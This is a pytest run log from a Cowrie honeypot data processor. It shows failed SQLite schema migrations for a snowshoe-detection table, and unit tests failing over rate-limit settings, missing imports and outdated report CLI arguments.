2025-10-18 18:32:40,836:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,836:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,836:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,836:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,836:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,836:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,836:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,836:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,838:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,838:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,838:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,838:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,838:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,838:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,838:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,838:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,838:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,838:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,840:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,840:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,840:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,840:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,840:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,840:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,840:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,840:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,840:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,840:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,842:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:40,842:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
Snowshoe detection schema migration (v8) completed successfully
Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:40,842:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:40,842:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:40,842:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:40,842:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:40,842:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:40,842:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:40,842:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:40,842:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
_____________ TestServiceRateLimits.test_service_rate_limits_exist _____________

self = <test_rate_limiting.TestServiceRateLimits object at 0x7756b32b2c10>

    def test_service_rate_limits_exist(self) -> None:
        """Test that all expected services have rate limits configured."""
        expected_services = {"dshield", "virustotal", "urlhaus", "spur"}
>       assert set(SERVICE_RATE_LIMITS.keys()) == expected_services
E       AssertionError: assert {'dshield', '... 'virustotal'} == {'dshield', '... 'virustotal'}
E         
E         Extra items in the left set:
E         'hibp'
E         Use -v to get more diff

/home/speterson/cowrieprocessor/tests/unit/test_rate_limiting.py:190: AssertionError
______________ TestServiceRateLimits.test_get_service_rate_limit _______________

self = <test_rate_limiting.TestServiceRateLimits object at 0x7756b32b2d50>

    def test_get_service_rate_limit(self) -> None:
        """Test getting rate limits for specific services."""
        rate, burst = get_service_rate_limit("virustotal")
>       assert rate == 4.0
E       assert 0.067 == 4.0

/home/speterson/cowrieprocessor/tests/unit/test_rate_limiting.py:195: AssertionError
____________ TestRefreshCacheTypes.test_parse_args_type_annotations ____________

self = <test_refresh_cache_types.TestRefreshCacheTypes object at 0x7756b32b3390>

    def test_parse_args_type_annotations(self) -> None:
        """Test that parse_args has proper type annotations."""
        # This test ensures we're using proper type annotations
        import os
    
        # Check that the function exists and has proper type annotations
        assert callable(parse_args)
    
        # Test function signature
        import inspect
        sig = inspect.signature(parse_args)
        assert len(sig.parameters) == 0
>       assert sig.return_annotation == argparse.Namespace
E       NameError: name 'argparse' is not defined. Did you forget to import 'argparse'?

/home/speterson/cowrieprocessor/tests/unit/test_refresh_cache_types.py:34: NameError
______ TestRefreshCacheTypes.test_ensure_indicator_table_type_annotations ______

self = <test_refresh_cache_types.TestRefreshCacheTypes object at 0x7756b32b34d0>

    def test_ensure_indicator_table_type_annotations(self) -> None:
        """Test that ensure_indicator_table has proper type annotations."""
        # This test ensures we're using proper type annotations
        import os
    
        # Check that the function exists and has proper type annotations
        assert callable(ensure_indicator_table)
    
        # Test function signature
        import inspect
        sig = inspect.signature(ensure_indicator_table)
        assert len(sig.parameters) == 1
>       assert sig.parameters['conn'].annotation == sqlite3.Connection
E       NameError: name 'sqlite3' is not defined. Did you forget to import 'sqlite3'?

/home/speterson/cowrieprocessor/tests/unit/test_refresh_cache_types.py:48: NameError
__________ TestRefreshCacheTypes.test_refresher_init_type_annotations __________

self = <test_refresh_cache_types.TestRefreshCacheTypes object at 0x7756b3d2b100>

    def test_refresher_init_type_annotations(self) -> None:
        """Test that Refresher.__init__ has proper type annotations."""
        # This test ensures we're using proper type annotations
        import os
    
        # Check that the class exists and has proper type annotations
        assert callable(Refresher)
    
        # Test function signature
        import inspect
        sig = inspect.signature(Refresher.__init__)
        assert len(sig.parameters) == 3  # self, args, conn
>       assert sig.parameters['args'].annotation == argparse.Namespace
E       NameError: name 'argparse' is not defined. Did you forget to import 'argparse'?

/home/speterson/cowrieprocessor/tests/unit/test_refresh_cache_types.py:63: NameError
_______ TestRefreshCacheTypes.test_refresher_cache_get_type_annotations ________

self = <test_refresh_cache_types.TestRefreshCacheTypes object at 0x7756b33b0950>

    def test_refresher_cache_get_type_annotations(self) -> None:
        """Test that Refresher.cache_get has proper type annotations."""
        # This test ensures we're using proper type annotations
        import os
    
        # Check that the method exists and has proper type annotations
        assert callable(Refresher.cache_get)
    
        # Test function signature
        import inspect
        sig = inspect.signature(Refresher.cache_get)
        assert len(sig.parameters) == 3  # self, service, key
        assert sig.parameters['service'].annotation == str
        assert sig.parameters['key'].annotation == str
>       assert sig.return_annotation == object
E       assert typing.Optional[typing.Any] == object
E        +  where typing.Optional[typing.Any] = <Signature (self, service: str, key: str) -> Optional[Any]>.return_annotation

/home/speterson/cowrieprocessor/tests/unit/test_refresh_cache_types.py:96: AssertionError
___ TestRefreshCacheTypes.test_refresher_should_refresh_vt_type_annotations ____

self = <test_refresh_cache_types.TestRefreshCacheTypes object at 0x7756b35f3f00>

    def test_refresher_should_refresh_vt_type_annotations(self) -> None:
        """Test that Refresher.should_refresh_vt has proper type annotations."""
        # This test ensures we're using proper type annotations
        import os
    
        # Check that the method exists and has proper type annotations
        assert callable(Refresher.should_refresh_vt)
    
        # Test function signature
        import inspect
        sig = inspect.signature(Refresher.should_refresh_vt)
        assert len(sig.parameters) == 3  # self, key, row
        assert sig.parameters['key'].annotation == str
>       assert sig.parameters['row'].annotation == object
E       assert typing.Optional[typing.Any] == object
E        +  where typing.Optional[typing.Any] = <Parameter "row: Optional[Any]">.annotation

/home/speterson/cowrieprocessor/tests/unit/test_refresh_cache_types.py:128: AssertionError
___ TestRefreshCacheTypes.test_refresher_should_refresh_ip_type_annotations ____

self = <test_refresh_cache_types.TestRefreshCacheTypes object at 0x7756b3433950>

    def test_refresher_should_refresh_ip_type_annotations(self) -> None:
        """Test that Refresher.should_refresh_ip has proper type annotations."""
        # This test ensures we're using proper type annotations
        import os
    
        # Check that the method exists and has proper type annotations
        assert callable(Refresher.should_refresh_ip)
    
        # Test function signature
        import inspect
        sig = inspect.signature(Refresher.should_refresh_ip)
        assert len(sig.parameters) == 2  # self, row
>       assert sig.parameters['row'].annotation == object
E       assert typing.Optional[typing.Any] == object
E        +  where typing.Optional[typing.Any] = <Parameter "row: Optional[Any]">.annotation

/home/speterson/cowrieprocessor/tests/unit/test_refresh_cache_types.py:143: AssertionError
_________ TestRefreshCacheTypes.test_refresh_reports_type_annotations __________

self = <test_refresh_cache_types.TestRefreshCacheTypes object at 0x7756b33f6990>

    def test_refresh_reports_type_annotations(self) -> None:
        """Test that refresh_reports has proper type annotations."""
        # This test ensures we're using proper type annotations
        import os
    
        # Check that the function exists and has proper type annotations
        assert callable(refresh_reports)
    
        # Test function signature
        import inspect
        sig = inspect.signature(refresh_reports)
        assert len(sig.parameters) == 2
        assert sig.parameters['db_path'].annotation == str
>       assert sig.parameters['args'].annotation == argparse.Namespace
E       NameError: name 'argparse' is not defined. Did you forget to import 'argparse'?

/home/speterson/cowrieprocessor/tests/unit/test_refresh_cache_types.py:247: NameError
___________________________ test_report_cli_dry_run ____________________________

self = ArgumentParser(prog='pytest', usage=None, description='Generate Cowrie reports from ORM data', formatter_class=<class 'argparse.HelpFormatter'>, conflict_handler='error', add_help=True)
args = ['daily', '2024-01-01', '--db', 'sqlite:////tmp/pytest-of-speterson/pytest-33/test_report_cli_dry_run0/report.sqlite', '--status-dir', '/tmp/pytest-of-speterson/pytest-33/test_report_cli_dry_run0/status']
namespace = Namespace(command=None), intermixed = False

    def _parse_known_args2(self, args, namespace, intermixed):
        if args is None:
            # args default to the system args
            args = _sys.argv[1:]
        else:
            # make sure that args are mutable
            args = list(args)
    
        # default Namespace built from parser defaults
        if namespace is None:
            namespace = Namespace()
    
        # add any action defaults that aren't present
        for action in self._actions:
            if action.dest is not SUPPRESS:
                if not hasattr(namespace, action.dest):
                    if action.default is not SUPPRESS:
                        setattr(namespace, action.dest, action.default)
    
        # add any parser defaults that aren't present
        for dest in self._defaults:
            if not hasattr(namespace, dest):
                setattr(namespace, dest, self._defaults[dest])
    
        # parse the arguments and exit if there are any errors
        if self.exit_on_error:
            try:
>               namespace, args = self._parse_known_args(args, namespace, intermixed)

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:1937: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:2169: in _parse_known_args
    positionals_end_index = consume_positionals(start_index)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:2144: in consume_positionals
    take_action(action, args)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:1998: in take_action
    argument_values = self._get_values(action, argument_strings)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:2528: in _get_values
    self._check_value(action, value[0])
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = ArgumentParser(prog='pytest', usage=None, description='Generate Cowrie reports from ORM data', formatter_class=<class 'argparse.HelpFormatter'>, conflict_handler='error', add_help=True)
action = _SubParsersAction(option_strings=[], dest='command', nargs='A...', const=None, default=None, type=None, choices={'trad...atter'>, conflict_handler='error', add_help=True)}, required=False, help='Report type', metavar=None, deprecated=False)
value = 'daily'

    def _check_value(self, action, value):
        # converted value must be one of the choices (if specified)
        choices = action.choices
        if choices is not None:
            if isinstance(choices, str):
                choices = iter(choices)
            if value not in choices:
                args = {'value': str(value),
                        'choices': ', '.join(map(str, action.choices))}
                msg = _('invalid choice: %(value)r (choose from %(choices)s)')
>               raise ArgumentError(action, msg % args)
E               argparse.ArgumentError: argument command: invalid choice: 'daily' (choose from traditional, ssh-keys, longtail)

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:2578: ArgumentError

During handling of the above exception, another exception occurred:

tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_report_cli_dry_run0')
capsys = <_pytest.capture.CaptureFixture object at 0x77566c24e360>

    def test_report_cli_dry_run(tmp_path, capsys) -> None:
        """CLI should emit report JSON and status file in dry-run mode."""
        db_path = tmp_path / "report.sqlite"
        db_url = _seed_db(db_path)
        status_dir = tmp_path / "status"
    
>       exit_code = report_cli.main(
            [
                "daily",
                "2024-01-01",
                "--db",
                db_url,
                "--status-dir",
                str(status_dir),
            ]
        )

/home/speterson/cowrieprocessor/tests/unit/test_report_cli.py:47: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/cli/report.py:517: in main
    args = parser.parse_args(list(argv) if argv is not None else None)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:1898: in parse_args
    args, argv = self.parse_known_args(args, namespace)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:1908: in parse_known_args
    return self._parse_known_args2(args, namespace, intermixed=False)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:1939: in _parse_known_args2
    self.error(str(err))
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:2658: in error
    self.exit(2, _('%(prog)s: error: %(message)s\n') % args)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = ArgumentParser(prog='pytest', usage=None, description='Generate Cowrie reports from ORM data', formatter_class=<class 'argparse.HelpFormatter'>, conflict_handler='error', add_help=True)
status = 2
message = "pytest: error: argument command: invalid choice: 'daily' (choose from traditional, ssh-keys, longtail)\n"

    def exit(self, status=0, message=None):
        if message:
            self._print_message(message, _sys.stderr)
>       _sys.exit(status)
E       SystemExit: 2

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:2645: SystemExit
----------------------------- Captured stderr call -----------------------------
usage: pytest [-h] {traditional,ssh-keys,longtail} ...
pytest: error: argument command: invalid choice: 'daily' (choose from traditional, ssh-keys, longtail)
_________________________ test_report_cli_all_sensors __________________________

self = ArgumentParser(prog='pytest', usage=None, description='Generate Cowrie reports from ORM data', formatter_class=<class 'argparse.HelpFormatter'>, conflict_handler='error', add_help=True)
args = ['daily', '2024-01-01', '--db', 'sqlite:////tmp/pytest-of-speterson/pytest-33/test_report_cli_all_sensors0/report.sqlite', '--all-sensors', '--status-dir', ...]
namespace = Namespace(command=None), intermixed = False

    def _parse_known_args2(self, args, namespace, intermixed):
        if args is None:
            # args default to the system args
            args = _sys.argv[1:]
        else:
            # make sure that args are mutable
            args = list(args)
    
        # default Namespace built from parser defaults
        if namespace is None:
            namespace = Namespace()
    
        # add any action defaults that aren't present
        for action in self._actions:
            if action.dest is not SUPPRESS:
                if not hasattr(namespace, action.dest):
                    if action.default is not SUPPRESS:
                        setattr(namespace, action.dest, action.default)
    
        # add any parser defaults that aren't present
        for dest in self._defaults:
            if not hasattr(namespace, dest):
                setattr(namespace, dest, self._defaults[dest])
    
        # parse the arguments and exit if there are any errors
        if self.exit_on_error:
            try:
>               namespace, args = self._parse_known_args(args, namespace, intermixed)

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:1937: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:2169: in _parse_known_args
    positionals_end_index = consume_positionals(start_index)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:2144: in consume_positionals
    take_action(action, args)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:1998: in take_action
    argument_values = self._get_values(action, argument_strings)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:2528: in _get_values
    self._check_value(action, value[0])
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = ArgumentParser(prog='pytest', usage=None, description='Generate Cowrie reports from ORM data', formatter_class=<class 'argparse.HelpFormatter'>, conflict_handler='error', add_help=True)
action = _SubParsersAction(option_strings=[], dest='command', nargs='A...', const=None, default=None, type=None, choices={'trad...atter'>, conflict_handler='error', add_help=True)}, required=False, help='Report type', metavar=None, deprecated=False)
value = 'daily'

    def _check_value(self, action, value):
        # converted value must be one of the choices (if specified)
        choices = action.choices
        if choices is not None:
            if isinstance(choices, str):
                choices = iter(choices)
            if value not in choices:
                args = {'value': str(value),
                        'choices': ', '.join(map(str, action.choices))}
                msg = _('invalid choice: %(value)r (choose from %(choices)s)')
>               raise ArgumentError(action, msg % args)
E               argparse.ArgumentError: argument command: invalid choice: 'daily' (choose from traditional, ssh-keys, longtail)

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:2578: ArgumentError

During handling of the above exception, another exception occurred:

tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_report_cli_all_sensors0')
capsys = <_pytest.capture.CaptureFixture object at 0x775671f19370>

    def test_report_cli_all_sensors(tmp_path, capsys) -> None:
        """CLI should handle --all-sensors by emitting no stdout and multiple checkpoints."""
        db_path = tmp_path / "report.sqlite"
        engine = create_engine(f"sqlite:///{db_path}")
        Base.metadata.create_all(engine)
        factory = sessionmaker(bind=engine, expire_on_commit=False)
    
        with factory() as session:
            session.add_all(
                [
                    SessionSummary(
                        session_id="s1",
                        first_event_at=datetime(2024, 1, 1, tzinfo=UTC),
                        last_event_at=datetime(2024, 1, 1, 1, tzinfo=UTC),
                        event_count=4,
                        command_count=2,
                        file_downloads=1,
                        login_attempts=0,
                        vt_flagged=0,
                        dshield_flagged=0,
                        matcher="sensor-a",
                    ),
                    SessionSummary(
                        session_id="s2",
                        first_event_at=datetime(2024, 1, 1, tzinfo=UTC),
                        last_event_at=datetime(2024, 1, 1, 2, tzinfo=UTC),
                        event_count=3,
                        command_count=1,
                        file_downloads=0,
                        login_attempts=0,
                        vt_flagged=0,
                        dshield_flagged=0,
                        matcher="sensor-b",
                    ),
                ]
            )
            session.commit()
    
>       exit_code = report_cli.main(
            [
                "daily",
                "2024-01-01",
                "--db",
                f"sqlite:///{db_path}",
                "--all-sensors",
                "--status-dir",
                str(tmp_path / "status"),
            ]
        )

/home/speterson/cowrieprocessor/tests/unit/test_report_cli.py:109: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/cli/report.py:517: in main
    args = parser.parse_args(list(argv) if argv is not None else None)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:1898: in parse_args
    args, argv = self.parse_known_args(args, namespace)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:1908: in parse_known_args
    return self._parse_known_args2(args, namespace, intermixed=False)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:1939: in _parse_known_args2
    self.error(str(err))
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:2658: in error
    self.exit(2, _('%(prog)s: error: %(message)s\n') % args)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = ArgumentParser(prog='pytest', usage=None, description='Generate Cowrie reports from ORM data', formatter_class=<class 'argparse.HelpFormatter'>, conflict_handler='error', add_help=True)
status = 2
message = "pytest: error: argument command: invalid choice: 'daily' (choose from traditional, ssh-keys, longtail)\n"

    def exit(self, status=0, message=None):
        if message:
            self._print_message(message, _sys.stderr)
>       _sys.exit(status)
E       SystemExit: 2

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:2645: SystemExit
----------------------------- Captured stderr call -----------------------------
usage: pytest [-h] {traditional,ssh-keys,longtail} ...
pytest: error: argument command: invalid choice: 'daily' (choose from traditional, ssh-keys, longtail)
